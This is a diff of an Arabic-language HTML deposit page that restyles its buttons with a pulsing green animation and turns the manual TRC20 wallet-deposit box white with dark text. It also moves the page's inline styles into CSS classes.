@@ -87,11 +87,36 @@
             margin: 20px auto 0 auto;
         }
         
-        /* تنسيق زر بايننس الجديد والمضمون */
-        .binance-btn-final {
+        /* تأثير النبض والوميض الأخضر للأزرار */
+        @keyframes greenGlowPulse {
+            0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
+            50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); }
+            100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
+        }
+
+        /* تنسيق زر المتابعة الجديد باللون الأخضر الوامض والنبضي */
+        .submit-btn-pulse {
+            font-family: 'Cairo', sans-serif; 
             width: 100%; 
             padding: 14px; 
-            background: #f3ba2f; 
+            color: #000000; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            margin-top: 20px; 
+            cursor: pointer;
+            box-sizing: border-box;
+            animation: greenGlowPulse 2s infinite ease-in-out;
+            transition: 0.2s;
+        }
+        .submit-btn-pulse:hover { transform: scale(1.02); }
+        
+        /* تنسيق زر بايننس الجديد والمضمون باللون الأخضر الوامض */
+        .binance-btn-final {
+            font-family: 'Cairo', sans-serif;
+            width: 100%; 
+            padding: 14px; 
             color: #000; 
             border: none; 
             border-radius: 8px; 
@@ -102,8 +127,38 @@
             text-decoration: none; 
             margin-bottom: 12px;
             box-sizing: border-box;
-            box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3);
+            animation: greenGlowPulse 2s infinite ease-in-out;
             transition: 0.2s;
+        }
+        .binance-btn-final:hover { transform: scale(1.02); }
+
+        /* حاوية الإيداع اليدوي باللون الأبيض الكامل وتنسيق نصوصها */
+        .manual-deposit-box {
+            margin-top: 25px; 
+            padding: 15px; 
+            border: 2px dashed #6c5ce7; 
+            border-radius: 8px; 
+            background-color: #ffffff; /* المربع الأبيض */
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(255,255,255,0.05);
+        }
+
+        /* حقل نص المحفظة داخل المربع الأبيض */
+        .crypto-address-input {
+            font-family: 'Cairo', sans-serif;
+            width: 100%; 
+            padding: 10px; 
+            text-align: center; 
+            background: #f1f2f6; 
+            color: #2f3542; /* لون خط داكن متناسق مع الخلفية البيضاء */
+            border: 1px solid #ced6e0; 
+            border-radius: 4px; 
+            font-size: 11px; 
+            direction: ltr; 
+            white-space: nowrap; 
+            overflow: hidden; 
+            text-overflow: ellipsis; 
+            box-sizing: border-box;
         }
 
         /* تنسيق زر التحقق من الحساب المسبق */
@@ -143,8 +198,8 @@
                     <label for="username">البريد الإلكتروني</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
-                <!-- تم إصلاح حجم الخط البرمجي المسبب للمشكلة هنا ليصبح 16px -->
-                <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
+                <!-- زر المتابعة باللون الأخضر الوامض والنابض مع الحجم المصلح 16px -->
+                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
                 
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
@@ -154,14 +209,16 @@
             <!-- الخطوة الثانية: خيارات الإيداع -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 
+                <!-- زر بايننس باللون الأخضر الوامض والنابض -->
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
                 </a>
 
-                <div style="margin-top: 25px; padding: 15px; border: 1px dashed #ffffff33; border-radius: 8px; background: #0f0c1b; text-align: center;">
-                    <p style="font-size: 14px; margin-bottom: 10px; color: #bbb;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
+                <!-- المربع المحدث باللون الأبيض الكامل والخط المتناسق الداكن -->
+                <div class="manual-deposit-box">
+                    <p style="font-size: 14px; margin-bottom: 10px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
-                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" readonly style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 11px; direction: ltr; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box;">
+                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
                     
                     <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 12px; width: 100%;">نسخ عنوان المحفظة</button>
                 </div>
